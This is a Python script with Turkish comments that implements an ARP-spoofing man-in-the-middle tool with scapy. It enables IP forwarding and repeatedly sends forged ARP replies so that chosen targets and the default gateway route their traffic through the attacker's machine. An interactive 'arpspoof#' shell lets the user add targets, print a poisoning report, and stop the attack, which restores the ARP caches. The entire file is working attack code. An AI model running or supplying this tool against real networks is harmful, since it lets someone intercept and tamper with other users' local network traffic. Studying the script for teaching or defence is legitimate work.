import os
import sys
import argparse
import threading
import queue
import time
import netifaces

from scapy.config import conf 
conf.ipv6_enabled = False

from scapy.all import *

IP = CMD = 0
MAC = HEDEF = 1


def MAC_adresi(arayüz,hedef_ip):
	#Ağ arayüzü kullanılarak hedefin mac adresini döner. Default arp paketi yollayınca hedef ip mac adresini dönüyor.
	try:
		kaynak_IP = get_if_addr(arayüz) #Saldırgan local ip
		kaynak_MAC = get_if_hwaddr(arayüz) #saldırgan arayüz mac adresi
		zehir = ARP(hwsrc=kaynak_MAC, psrc=kaynak_IP) 
													#ARP fonksiyonu ile zehir oluşturdum Ağdaki cihazları bulmak için.
													#Parametre1: hardware source(donanımın mac adresi)
													#Parametre2: poison(zehir) ip adresi (donanım ip adresi)
													
		zehir.hwdst = 'ff:ff:ff:ff:ff:ff' #broadcast yayın için. ARP paketi için mac belli olmadığından tüm mac adreslerine gönder demek.
		zehir.pdst = hedef_ip #zehirin hangi hedefe/ip ye gideceğini tanımladım.
		cevaplar, cevapsız_paket = sr(zehir, timeout=5, verbose=0)  #sr layer2 de çalışan paket gönderme ve alma komutudur. 2 tane değer döndürür.
																#paket gönderildiğinde cevaplanan ve cevaplanmayan paketlerin değerleri geri döner.
																#timeout ile cihazların arp paketine cevap vermesi için zaman aşımı belirlenir.
																#5 sn sonra cevap gelmezse cevapsız_paketlere aktarılır. cevap gelirse cevap değişkenine
																#aktarılır. verbose ise fazla ayrıntılı olmasını engelliyor. 
																
		if len(cevapsız_paket) > 0:
			#cevap yoksa
			print("%s için MAC adresi tespit edilemedi!" % hedef_ip)
			exit()
			
		else:
			return cevaplar[0][1].hwsrc # gelen cevaplardan hostların(donanımların) mac adreslerini dönüyor
			#print(cevaplar[0][1].psrc ,cevaplar[0][1].hwsrc)

	except socket.gaierror:	
		print("IP adresi doğru formatta değil!")
	except OSError:
		print("Ağ arayüzü bulunamadı!")



def zehirlemeyi_başlat(hedefler, ağ_geçidi, kontrol_kuyruk, saldırgan_MAC):
	os.system("echo 1 > /proc/sys/net/ipv4/ip_forward") #IP yönlendirmesi aktif
	print("IP yönlendirmesi etkin...")



	durum = False

	while not durum:
		#kuyrukta kontrol mesajı olmadığı sürece ARP zehirlemesi devam edecek
		while kontrol_kuyruk.empty():
			for h in hedefler:
				ARP_gönder(h[IP], h[MAC], ağ_geçidi[IP], saldırgan_MAC) #Hedefin bana veri göndermesi için cevap gönderdim. Ben ağ geçidiyim diyerek
				ARP_gönder(ağ_geçidi[IP], ağ_geçidi[MAC], h[IP], saldırgan_MAC) #Ağ geçidinin de arp tablosunu zehirledim. hedefe giden paketler bana gelsin diye
			time.sleep(1)

		#kontrol dizisi(kuyruk boş değilse döngü biter ve bu kısıma geçer)
		try:
			eleman = kontrol_kuyruk.get(block = False) #kontrol_kuyruk (ilk giren ilk çıkan mantığıyla çalışır) get kuyruktaki veriyi alır.
		except Empty:
			#thread ile çalışan döngü için boş olma ihtimalinde çıkış yapılmaz
			print("Ölümcül Hata... (Boş bırakmayın!)")

		komut = eleman[CMD].lower() #elemanların hepsini küçük harf yap ama sadece komut kısmını yani cmd = 0, tuple daki ilk 0 indisli elemanu
		if komut == "kapat":
			durum = True

		elif komut == "ekle":
			hedefler.append(eleman[HEDEF])
			print("isteye eklendi.")

		elif komut == "rapor":
			print("\n\n")
			print("*" * 10, "Zehirleme Raporu", "*" * 10)
			print("Ağ geçidi: {0}".format(ağ_geçidi))
			for h in hedefler:
				print("IP: %s  MAC: %s " % h)
			print("*" * 38)
			print("\n")
	#Bütün cihazların arp tablosunu sıfırladım
	düzelt(hedefler, ağ_geçidi)



def düzelt(hedefler, ağ_geçidi):
	#hedeflere ve ağ geçidine doğru paketleri ARP yanıtları gönderiyor.
	print("Saldırı durduruluyor, ARP önbellekleri düzeltiliyor...")
	for i in range(3):
		for h in hedefler:
			ARP_gönder(h[IP], h[MAC], ağ_geçidi[IP], ağ_geçidi[MAC])
			ARP_gönder(ağ_geçidi[IP], ağ_geçidi[MAC], h[IP], h[MAC])
		time.sleep(1)
	print("ARP önbellekleri düzeltildi!")


def ARP_gönder(gönderilecek_IP, gönderilecek_MAC, kaynak_IP, kaynak_MAC):
	#op = 2 ARP cevabıdır. Yani cevap paketi olmasını sağlıyor
	#psrc / hwsrc, hedefin sahip olmasını istediğimiz verilerdir
	arp_paketi = ARP(op=2, pdst=gönderilecek_IP, hwdst=gönderilecek_MAC, 
						   psrc=kaynak_IP,       hwsrc=kaynak_MAC)
	send(arp_paketi, verbose=0)  #send metodu scapyden geliyor. verbose = 0 detay olmasın demek


##################################################################################################################
kontrol_kuyruk = Queue();

arayüz = get_working_if()
saldırgan_MAC = get_if_hwaddr(arayüz)
ağ_geçidi = netifaces.gateways()["default"][2][0]

hedef_ip = input("[*] Hedef IP/IP'ler: ")

print("[+] Kullanılan Arayüz: %s (%s)" % (arayüz,saldırgan_MAC))


#Tuple element oluşturuyorum. (IP-MAC) Eşleşmesi
hedefler_MAC_IP = [(h.strip(), MAC_adresi(arayüz, h.strip())) for h in hedef_ip.split(',')]
geçit_MAC_IP  = (ağ_geçidi, MAC_adresi(arayüz, ağ_geçidi))

#thread tanımlayıp başlattım.
zehir_iş_parçacığı = Thread(target=zehirlemeyi_başlat, args=(hedefler_MAC_IP,geçit_MAC_IP,kontrol_kuyruk,saldırgan_MAC))
zehir_iş_parçacığı.start()

try: 
	#zehir parçacığı hala çalışıyor (canlı) ise döngü devam edecek.
	while zehir_iş_parçacığı.is_alive():
		time.sleep(1)

		komut = input('arpspoof# ').split()
		if komut:
			kmt = komut[CMD].lower()
			if kmt in ['yardım','?']:
				print("ekle <IP>: Zehirleme listesine IP adresini ekler.\n" + \
					  "rapor: Zehirleme raporunu gösterir.\n" + \
					  "kapat: Zehirlemeyi durdurur ve çıkış yapar.")

			elif kmt == "kapat":
				kontrol_kuyruk.put((kmt,))
				zehir_iş_parçacığı.join() #thread kapatacak.

			elif kmt == "ekle":
				ip = komut[HEDEF]
				print("Eklenen IP:",ip)
				try:
					hedef = (ip, MAC_adresi(arayüz, ip))
					kontrol_kuyruk.put((kmt, hedef))
				except Exception:
					print("IP adresi eklenemedi: %s" % ip)

			elif kmt == "rapor":
				kontrol_kuyruk.put((kmt,))
except KeyboardInterrupt:
	#CTRL+C basınca işlem yapacak
	kontrol_kuyruk.put(("kapat",))
	zehir_iş_parçacığı.join()
	print("Görüşmek üzere.... İlkcan Doğan...")
